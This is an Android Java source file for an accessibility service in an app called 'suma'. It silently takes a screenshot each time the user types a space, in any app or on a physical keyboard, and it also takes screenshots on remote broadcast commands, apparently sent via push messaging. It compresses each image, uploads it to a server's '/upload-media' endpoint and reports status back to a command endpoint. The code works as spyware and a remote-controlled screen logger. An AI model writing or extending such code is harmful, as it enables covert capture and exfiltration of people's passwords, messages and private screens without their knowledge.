package com.example.suma;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import org.json.JSONObject;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.Executor;

public class GlobalActionService extends AccessibilityService {

    private static final String TAG = "SumaAccessibility";
    public static final String ACTION_SCREENSHOT = "com.example.suma.ACTION_SCREENSHOT";

    private BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (ACTION_SCREENSHOT.equals(intent.getAction())) {
                String commandId = intent.getStringExtra("command_id");
                Log.d(TAG, "Received screenshot request via Broadcast. Command ID: " + commandId);
                performGlobalScreenshot(commandId);
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "GlobalActionService CREATE");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "GlobalActionService COMPONENT CONNECTED");

        try {
            IntentFilter filter = new IntentFilter(ACTION_SCREENSHOT);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // Use EXPORTED since FCM service sends broadcasts to this receiver
                registerReceiver(screenshotReceiver, filter, Context.RECEIVER_EXPORTED);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                registerReceiver(screenshotReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(screenshotReceiver, filter);
            }
            Log.d(TAG, "Receiver Registered Successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register receiver: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public boolean onUnbind(Intent intent) {
        try {
            unregisterReceiver(screenshotReceiver);
        } catch (Exception e) {
            // Receiver might not be registered
        }
        return super.onUnbind(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Detect "Space" typing via text changes
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                // Check if any added text contains a space
                // We look at the 'added count' to see what was just typed/pasted
                int addedCount = event.getAddedCount();
                if (addedCount > 0) {
                    // The text list typically contains the FULL text of the field.
                    // It's hard to isolate *exactly* what was added without keeping state.
                    // But we can check if the total length increased and if 'space' is likely
                    // involved.

                    // Simple robust check: simple heuristic - if the event text has spaces, check
                    // if we entered one.
                    // Better: Check event.getFromIndex().

                    // Let's iterate the text list. Usually index 0 has the full content.
                    CharSequence textSeq = event.getText().get(0);
                    if (textSeq != null) {
                        String text = textSeq.toString();
                        int beforeLen = event.getBeforeText() != null ? event.getBeforeText().length() : 0;

                        // If we grew in length...
                        if (text.length() > beforeLen) {
                            // ...and we detect a space was potentially part of that growth.
                            // It's hard to be 100% sure without diffing, but checking if the
                            // character at (fromIndex + addedCount - 1) is a space is a good guess if
                            // typing sequentially.
                            // Or just:
                            if (text.contains(" ")) {
                                // For "ANY" space detection, this might trigger too often (on every letter
                                // typed in a sentence).
                                // We probably only want to trigger when the space is the *new* character.

                                int fromIndex = event.getFromIndex();
                                // Added text range: [fromIndex, fromIndex + addedCount)
                                if (fromIndex >= 0 && (fromIndex + addedCount) <= text.length()) {
                                    CharSequence addedText = text.subSequence(fromIndex, fromIndex + addedCount);
                                    if (addedText.toString().contains(" ")) {
                                        Log.d(TAG, "Space detected in added text -> Triggering Screenshot (Silent)");
                                        performGlobalScreenshot(null);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        // Physical Key Interception
        if (event.getAction() == KeyEvent.ACTION_DOWN && event.getKeyCode() == KeyEvent.KEYCODE_SPACE) {
            Log.d(TAG, "Physical Space Bar Detected -> Triggering Screenshot (Silent)");
            performGlobalScreenshot(null);
            return false; // Don't consume it, let it type a space
        }
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        // Not used
    }

    private void performGlobalScreenshot(final String commandId) {
        if (Build.VERSION.SDK_INT >= 30) {
            takeScreenshot(Display.DEFAULT_DISPLAY, new Executor() {
                @Override
                public void execute(Runnable command) {
                    command.run();
                }
            }, new TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                    Log.d(TAG, "Screenshot Taken Successfully");
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(),
                            screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        // We need a copy because HardwareBuffer might be closed
                        Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                        bitmap.recycle();
                        screenshotResult.getHardwareBuffer().close();
                        saveAndUpload(copy, commandId);
                    }
                }

                @Override
                public void onFailure(@NonNull int errorCode) {
                    Log.e(TAG, "Screenshot Failed: " + errorCode);
                    reportStatus(commandId, "failed", "Screenshot failed with error code: " + errorCode);
                }
            });
        } else {
            // Fallback for Global Action (Take Screenshot) - API 28+
            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
            // On older APIs we can't easily get the bitmap from this action
            Log.w(TAG,
                    "Fallback Screenshot action triggered. Note: Upload is only supported on Android 11+ via this service.");
        }
    }

    private void reportStatus(String commandId, String status, String message) {
        if (commandId == null)
            return;

        String authToken = AuthManager.getToken(this);
        if (authToken == null)
            return;

        JSONObject json = new JSONObject();
        try {
            json.put("command_id", commandId);
            json.put("status", status);
            if (message != null)
                json.put("response_message", message);

            NetworkUtils.postJson(AuthManager.getBaseUrl() + "/command/status", json.toString(),
                    new NetworkUtils.Callback() {
                        @Override
                        public void onSuccess(String response) {
                            Log.d(TAG, "Status reported: " + status);
                        }

                        @Override
                        public void onError(String error) {
                            Log.e(TAG, "Status report failed: " + error);
                        }
                    }, authToken);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveAndUpload(Bitmap bitmap, final String commandId) {
        try {
            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos);
            fos.flush();
            fos.close();

            Log.d(TAG, "Screenshot saved to: " + file.getAbsolutePath());

            // Use AuthManager to get the correct token and URL
            String authToken = AuthManager.getToken(this);
            String baseUrl = AuthManager.getBaseUrl();

            if (authToken != null) {
                NetworkUtils.uploadFile(baseUrl + "/upload-media", file, authToken,
                        new NetworkUtils.Callback() {
                            @Override
                            public void onSuccess(String response) {
                                Log.d(TAG, "Upload Success: " + response);
                                file.delete();
                                reportStatus(commandId, "executed", "Screenshot uploaded successfully.");
                            }

                            @Override
                            public void onError(String error) {
                                Log.e(TAG, "Upload Failed: " + error);
                                reportStatus(commandId, "failed", "Upload failed: " + error);
                            }
                        });
            } else {
                Log.e(TAG, "Auth Token is null, cannot upload.");
            }

        } catch (Exception e) {
            e.printStackTrace();
            reportStatus(commandId, "failed", "Error: " + e.getMessage());
        }
    }
}
